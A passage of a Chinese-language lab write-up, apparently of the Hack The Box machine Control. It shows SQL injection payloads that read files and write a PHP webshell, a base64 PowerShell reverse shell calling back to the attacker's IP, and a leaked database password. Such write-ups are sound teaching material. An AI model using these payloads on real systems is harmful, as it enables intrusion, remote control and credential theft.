+</span></span></code></pre></div><p><img src=Pasted%20image%2020261012161822.png alt></p><p>查询文件限制，返回 NULL，说明 MariaDB 不限制路径，可能可以写文件。</p><ul><li>@@securet_file_priv：控制数据库做文件操作，空字符串/未设置 可任意访问路径；某个目录则只能操作该目录下的文件；NULL 属于未设置，同意不限制。</li><li>IFNULL（x,y）：值不是 NULL 就返回原值，是 NULL 就返回替身。</li><li>0x4e554c4c：NULL 的十六进制。</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&#39;</span> UNION SELECT IFNULL<span style=color:#f92672>(</span>@@secure_file_priv,0x4e554c4c<span style=color:#f92672>)</span>,2,3,4,5,6-- -
+</span></span></code></pre></div><p><img src=Pasted%20image%2020261012162005.png alt></p><p>直接读取网站的根目录，返回 NULL。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#e6db74>&#39; UNION SELECT IFNULL(LOAD_FILE(&#39;</span>C:/xampp/htdocs/index.php<span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#f92672>)</span>,0x4e554c4c<span style=color:#f92672>)</span>,2,3,4,5,6-- -
+</span></span></code></pre></div><p><img src=Pasted%20image%2020261012163149.png alt></p><p>将查询的请求保存为 <code>req.txt</code>。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Control<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ cat req.txt
+</span></span><span style=display:flex><span>POST /search_products.php HTTP/1.1
+</span></span><span style=display:flex><span>Host: 10.129.54.109
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>322</span>
+</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.9
+</span></span><span style=display:flex><span>Origin: http://10.129.54.109
+</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>X11; Linux x86_64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/146.0.0.0 Safari/537.36
+</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style=color:#f92672>=</span>0.8,application/signed-exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.7
+</span></span><span style=display:flex><span>Referer: http://10.129.54.109/admin.php
+</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style=display:flex><span>Connection: keep-alive
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>productName<span style=color:#f92672>=</span>test
+</span></span></code></pre></div><p>用 sqlmap 尝试自动注入，没得到更多有效的信息。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Control<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ sudo sqlmap -r req.txt -p productName --dbms<span style=color:#f92672>=</span>mysql --technique<span style=color:#f92672>=</span>UE --union-cols<span style=color:#f92672>=</span><span style=color:#ae81ff>6</span> --parse-errors --batch --level<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> --risk<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span> --threads<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span> --flush-session
+</span></span><span style=display:flex><span>        ___
+</span></span><span style=display:flex><span>       __H__
+</span></span><span style=display:flex><span> ___ ___<span style=color:#f92672>[</span>.<span style=color:#f92672>]</span>_____ ___ ___  <span style=color:#f92672>{</span>1.10.3#stable<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>|_ -| . <span style=color:#f92672>[(]</span>     | .<span style=color:#e6db74>&#39;| . |
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|___|_  [)]_|_|_|__,|  _|
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      |_|V...       |_|   https://sqlmap.org
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span style=color:#66d9ef>for</span> any misuse or damage caused by this program
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> starting @ 04:59:28 /2026-10-12/
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>04:59:28<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> parsing HTTP request from <span style=color:#e6db74>&#39;req.txt&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>04:59:28<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing connection to the target URL
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>04:59:28<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> potential permission problems detected <span style=color:#f92672>(</span><span style=color:#e6db74>&#39;Access Denied&#39;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>04:59:28<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> checking <span style=color:#66d9ef>if</span> the target is protected by some kind of WAF/IPS
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>04:59:29<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> heuristic <span style=color:#f92672>(</span>basic<span style=color:#f92672>)</span> test shows that POST parameter <span style=color:#e6db74>&#39;productName&#39;</span> might not be injectable
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>04:59:29<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing <span style=color:#66d9ef>for</span> SQL injection on POST parameter <span style=color:#e6db74>&#39;productName&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>04:59:29<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing <span style=color:#e6db74>&#39;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>04:59:32<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing <span style=color:#e6db74>&#39;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>04:59:34<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing <span style=color:#e6db74>&#39;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>04:59:37<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing <span style=color:#e6db74>&#39;MySQL &gt;= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>04:59:39<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing <span style=color:#e6db74>&#39;MySQL &gt;= 5.6 error-based - Parameter replace (GTID_SUBSET)&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>04:59:39<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing <span style=color:#e6db74>&#39;MySQL &gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>04:59:39<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing <span style=color:#e6db74>&#39;MySQL &gt;= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>04:59:40<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing <span style=color:#e6db74>&#39;MySQL &gt;= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>04:59:40<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing <span style=color:#e6db74>&#39;Generic UNION query (NULL) - 6 to 6 columns (custom)&#39;</span>
+</span></span><span style=display:flex><span>injection not exploitable with NULL values. Do you want to try with a random integer value <span style=color:#66d9ef>for</span> option <span style=color:#e6db74>&#39;--union-char&#39;</span>? <span style=color:#f92672>[</span>Y/n<span style=color:#f92672>]</span> Y
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>05:00:52<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing <span style=color:#e6db74>&#39;MySQL UNION query (20) - 6 to 6 columns (custom)&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>05:01:59<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> POST parameter <span style=color:#e6db74>&#39;productName&#39;</span> does not seem to be injectable
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>05:01:59<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>CRITICAL<span style=color:#f92672>]</span> all tested parameters <span style=color:#66d9ef>do</span> not appear to be injectable. Try to increase values <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;--level&#39;</span>/<span style=color:#e6db74>&#39;--risk&#39;</span> options <span style=color:#66d9ef>if</span> you wish to perform more tests. Rerun without providing the option <span style=color:#e6db74>&#39;--technique&#39;</span>. If you suspect that there is some kind of protection mechanism involved <span style=color:#f92672>(</span>e.g. WAF<span style=color:#f92672>)</span> maybe you could try to use option <span style=color:#e6db74>&#39;--tamper&#39;</span> <span style=color:#f92672>(</span>e.g. <span style=color:#e6db74>&#39;--tamper=space2comment&#39;</span><span style=color:#f92672>)</span> and/or switch <span style=color:#e6db74>&#39;--random-agent&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>05:01:59<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> your sqlmap version is outdated
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ending @ 05:01:59 /2026-10-12/
+</span></span></code></pre></div><p>翻阅源码的时候发现了很多 php 文件。</p><p><img src=Pasted%20image%2020261012172519.png alt></p><p>一次性加入多个路径判断是否可以读取。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#e6db74>&#39; UNION SELECT CONCAT(&#39;</span>base<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;,IFNULL(@@basedir,0x4e554c4c),&#39;</span>|hist1<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;,IF(LOAD_FILE(&#39;</span>C:/inetpub/history/CFGHISTORY_0000000001/applicationHost.config<span style=color:#e6db74>&#39;) IS NULL,&#39;</span>NO<span style=color:#e6db74>&#39;,&#39;</span>YES<span style=color:#e6db74>&#39;),&#39;</span>|hist2<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;,IF(LOAD_FILE(&#39;</span>C:/inetpub/history/CFGHISTORY_0000000002/applicationHost.config<span style=color:#e6db74>&#39;) IS NULL,&#39;</span>NO<span style=color:#e6db74>&#39;,&#39;</span>YES<span style=color:#e6db74>&#39;),&#39;</span>|php_a<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;,IF(LOAD_FILE(&#39;</span>C:/PHP/php.ini<span style=color:#e6db74>&#39;) IS NULL,&#39;</span>NO<span style=color:#e6db74>&#39;,&#39;</span>YES<span style=color:#e6db74>&#39;),&#39;</span>|php_b<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;,IF(LOAD_FILE(&#39;</span>C:/php/php.ini<span style=color:#e6db74>&#39;) IS NULL,&#39;</span>NO<span style=color:#e6db74>&#39;,&#39;</span>YES<span style=color:#e6db74>&#39;),&#39;</span>|php_c<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;,IF(LOAD_FILE(&#39;</span>C:/Windows/php.ini<span style=color:#e6db74>&#39;) IS NULL,&#39;</span>NO<span style=color:#e6db74>&#39;,&#39;</span>YES<span style=color:#e6db74>&#39;),&#39;</span>|php_d<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;,IF(LOAD_FILE(&#39;</span>C:/Program Files/PHP/v7.3/php.ini<span style=color:#e6db74>&#39;) IS NULL,&#39;</span>NO<span style=color:#e6db74>&#39;,&#39;</span>YES<span style=color:#e6db74>&#39;),&#39;</span>|www<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;,IF(LOAD_FILE(&#39;</span>C:/inetpub/wwwroot/index.php<span style=color:#e6db74>&#39;) IS NULL,&#39;</span>NO<span style=color:#e6db74>&#39;,&#39;</span>YES<span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#f92672>))</span>,2,3,4,5,6-- -
+</span></span></code></pre></div><p><img src=Pasted%20image%2020261012173438.png alt></p><p>读取搜索页的源码。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#e6db74>&#39; UNION SELECT IFNULL(LOAD_FILE(&#39;</span>C:/inetpub/wwwroot/search_products.php<span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#f92672>)</span>,0x4e554c4c<span style=color:#f92672>)</span>,2,3,4,5,6-- -
+</span></span></code></pre></div><p>确认 SQL 是直接把参数拼进单引号里。</p><p><img src=Pasted%20image%2020261012173752.png alt></p><p>用 INTO OUTFILE 往网站根目录写一个一句话木马，前缀让原查询匹配零行，文件里只有这一行。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>enil<span style=color:#e6db74>&#39; UNION SELECT &#39;</span>&lt;?php system<span style=color:#f92672>(</span>$_REQUEST<span style=color:#f92672>[</span><span style=color:#e6db74>&#34;c&#34;</span><span style=color:#f92672>])</span>;?&gt;<span style=color:#e6db74>&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39; INTO OUTFILE &#39;</span>C:/inetpub/wwwroot/x.php<span style=color:#960050;background-color:#1e0010>&#39;</span>-- -
+</span></span></code></pre></div><p><img src=Pasted%20image%2020261012174010.png alt></p><h2 id=代码执行>代码执行</h2><p>访问刚写进去的木马，<code>whoami</code> 拿到回显，获得一个低权限执行点。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Control<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ curl -sS -i --max-time <span style=color:#ae81ff>10</span> -H <span style=color:#e6db74>&#39;X-Forwarded-For: 192.168.4.28&#39;</span> <span style=color:#e6db74>&#39;http://10.129.54.109/x.php?c=whoami&#39;</span>
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+</span></span><span style=display:flex><span>Content-Type: text/html; charset<span style=color:#f92672>=</span>UTF-8
+</span></span><span style=display:flex><span>Server: Microsoft-IIS/10.0
+</span></span><span style=display:flex><span>X-Powered-By: PHP/7.3.7
+</span></span><span style=display:flex><span>Date: Mon, <span style=color:#ae81ff>12</span> Oct <span style=color:#ae81ff>2026</span> 08:53:59 GMT
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>25</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>nt authority<span style=color:#ae81ff>\i</span>usr
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Control<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ curl -sS -H <span style=color:#e6db74>&#39;X-Forwarded-For: 192.168.4.28&#39;</span> <span style=color:#e6db74>&#39;http://10.129.54.197/x.php&#39;</span> --data-urlencode <span style=color:#e6db74>&#39;c=powershell -nop -c whoami&#39;</span>
+</span></span><span style=display:flex><span>nt authority<span style=color:#ae81ff>\i</span>usr
+</span></span></code></pre></div><p>用 base64 编码的 Powershell 让机器主动连回 Kali。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Control<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ curl -sS --max-time <span style=color:#ae81ff>25</span> -H <span style=color:#e6db74>&#39;X-Forwarded-For: 192.168.4.28&#39;</span> --data-urlencode <span style=color:#e6db74>&#34;c=start /b powershell -nop -w hidden -enc </span><span style=color:#66d9ef>$(</span>printf <span style=color:#e6db74>&#39;%s&#39;</span> <span style=color:#e6db74>&#39;$c=New-Object Net.Sockets.TCPClient(&#34;10.10.16.151&#34;,4444);$s=$c.GetStream();$e=New-Object Text.ASCIIEncoding;$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;while($true){$w.Write(&#34;PS &#34;+(Get-Location).Path+&#34;&gt; &#34;);$b=New-Object byte[] 65536;$i=$s.Read($b,0,65536);if($i -le 0){break};$cmd=$e.GetString($b,0,$i).Trim();if($cmd -eq &#34;exit&#34;){break};$r=&#34;&#34;;try{$r=(iex $cmd 2&gt;&amp;1|Out-String)}catch{$r=&#34;ERR: $_&#34;};$w.Write($r)}&#39;</span> | iconv -t UTF-16LE | base64 -w0<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> http://10.129.54.197/x.php
+</span></span></code></pre></div><p>拿到可执行命令的 shell。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Control<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ sudo rlwrap -cAr nc -lvnp <span style=color:#ae81ff>4444</span>
+</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>4444</span> ...
+</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.10.16.151<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.129.54.197<span style=color:#f92672>]</span> <span style=color:#ae81ff>49674</span>
+</span></span><span style=display:flex><span>PS C:<span style=color:#ae81ff>\i</span>netpub<span style=color:#ae81ff>\w</span>wwroot&gt; whoami
+</span></span><span style=display:flex><span>nt authority<span style=color:#ae81ff>\i</span>usr
+</span></span></code></pre></div><h2 id=提权至-hector>提权至 hector</h2><p>查看权限发现有 <code>ImpersonatePrivilege</code>，可以尝试一下 Potato 提权。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\i</span>netpub<span style=color:#ae81ff>\w</span>wwroot&gt; whoami /priv
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PRIVILEGES INFORMATION
+</span></span><span style=display:flex><span>----------------------
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Privilege Name          Description                               State  
+</span></span><span style=display:flex><span><span style=color:#f92672>=======================</span> <span style=color:#f92672>=========================================</span> <span style=color:#f92672>=======</span>
+</span></span><span style=display:flex><span>SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
+</span></span><span style=display:flex><span>SeImpersonatePrivilege  Impersonate a client after authentication Enabled
+</span></span><span style=display:flex><span>SeCreateGlobalPrivilege Create global objects                     Enabled
+</span></span></code></pre></div><p>查看本机监听的端口，只有 5985。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\i</span>netpub<span style=color:#ae81ff>\w</span>wwroot&gt; netstat -ano | findstr LISTENING
+</span></span><span style=display:flex><span>  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       <span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span>  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       <span style=color:#ae81ff>812</span>
+</span></span><span style=display:flex><span>  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       <span style=color:#ae81ff>1984</span>
+</span></span><span style=display:flex><span>  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       <span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span>  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       <span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span>  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       <span style=color:#ae81ff>452</span>
+</span></span><span style=display:flex><span>  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       <span style=color:#ae81ff>68</span>
+</span></span><span style=display:flex><span>  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       <span style=color:#ae81ff>956</span>
+</span></span><span style=display:flex><span>  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       <span style=color:#ae81ff>1716</span>
+</span></span><span style=display:flex><span>  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       <span style=color:#ae81ff>584</span>
+</span></span><span style=display:flex><span>  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       <span style=color:#ae81ff>604</span>
+</span></span><span style=display:flex><span>  TCP    <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:80                <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:0                 LISTENING       <span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span>  TCP    <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:135               <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:0                 LISTENING       <span style=color:#ae81ff>812</span>
+</span></span><span style=display:flex><span>  TCP    <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:3306              <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:0                 LISTENING       <span style=color:#ae81ff>1984</span>
+</span></span><span style=display:flex><span>  TCP    <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:5985              <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:0                 LISTENING       <span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span>  TCP    <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:47001             <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:0                 LISTENING       <span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span>  TCP    <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:49664             <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:0                 LISTENING       <span style=color:#ae81ff>452</span>
+</span></span><span style=display:flex><span>  TCP    <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:49665             <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:0                 LISTENING       <span style=color:#ae81ff>68</span>
+</span></span><span style=display:flex><span>  TCP    <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:49666             <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:0                 LISTENING       <span style=color:#ae81ff>956</span>
+</span></span><span style=display:flex><span>  TCP    <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:49667             <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:0                 LISTENING       <span style=color:#ae81ff>1716</span>
+</span></span><span style=display:flex><span>  TCP    <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:49668             <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:0                 LISTENING       <span style=color:#ae81ff>584</span>
+</span></span><span style=display:flex><span>  TCP    <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:49669             <span style=color:#f92672>[</span>::<span style=color:#f92672>]</span>:0                 LISTENING       <span style=color:#ae81ff>604</span>
+</span></span></code></pre></div><p>查看 web 目录下的文件发现有一个 <code>database.php</code>。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\i</span>netpub<span style=color:#ae81ff>\w</span>wwroot&gt; dir
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Directory: C:<span style=color:#ae81ff>\i</span>netpub<span style=color:#ae81ff>\w</span>wwroot
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name                                                                  
+</span></span><span style=display:flex><span>----                -------------         ------ ----                                                                  
+</span></span><span style=display:flex><span>d-----       10/23/2019   5:02 PM                assets                                                                
+</span></span><span style=display:flex><span>d-----        11/5/2019   2:42 PM                images                                                                
+</span></span><span style=display:flex><span>d-----       11/12/2019  11:49 AM                uploads                                                               
+</span></span><span style=display:flex><span>------        11/5/2019   2:42 PM           <span style=color:#ae81ff>7867</span> about.php                                                             
+</span></span><span style=display:flex><span>-a----       11/20/2019   1:16 AM           <span style=color:#ae81ff>7350</span> admin.php                                                             
+</span></span><span style=display:flex><span>------        11/5/2019   2:42 PM            <span style=color:#ae81ff>479</span> create_category.php                                                   
+</span></span><span style=display:flex><span>------        11/5/2019   2:42 PM            <span style=color:#ae81ff>585</span> create_product.php                                                    
+</span></span><span style=display:flex><span>------        11/5/2019   2:42 PM            <span style=color:#ae81ff>904</span> database.php                                                          
+</span></span><span style=display:flex><span>------        11/5/2019   2:42 PM            <span style=color:#ae81ff>423</span> delete_category.php                                                   
+</span></span><span style=display:flex><span>------        11/5/2019   2:42 PM            <span style=color:#ae81ff>558</span> delete_product.php                                                    
+</span></span><span style=display:flex><span>-a----       11/19/2019   5:57 PM           <span style=color:#ae81ff>3145</span> index.php                                                             
+</span></span><span style=display:flex><span>------        11/5/2019   2:42 PM          <span style=color:#ae81ff>17128</span> LICENSE.txt                                                           
+</span></span><span style=display:flex><span>-a----       11/19/2019   6:07 PM           <span style=color:#ae81ff>3578</span> search_products.php                                                   
+</span></span><span style=display:flex><span>------        11/5/2019   2:42 PM            <span style=color:#ae81ff>498</span> update_category.php                                                   
+</span></span><span style=display:flex><span>------        11/5/2019   2:42 PM           <span style=color:#ae81ff>4056</span> update_product.php                                                    
+</span></span><span style=display:flex><span>------        11/5/2019   2:42 PM           <span style=color:#ae81ff>2933</span> view_product.php                                                      
+</span></span><span style=display:flex><span>-a----       10/13/2026   4:51 AM             <span style=color:#ae81ff>37</span> x.php
+</span></span></code></pre></div><p>查看 <code>database.php</code> 发现了 manager 的密码是 <code>l3tm3!n</code>。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\i</span>netpub<span style=color:#ae81ff>\w</span>wwroot&gt; type database.php                                                                                                            
+</span></span><span style=display:flex><span>&lt;?php                                                                                                                                               
+</span></span><span style=display:flex><span>class Database                                                                                                                                      
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span>                                                                                                                                                   
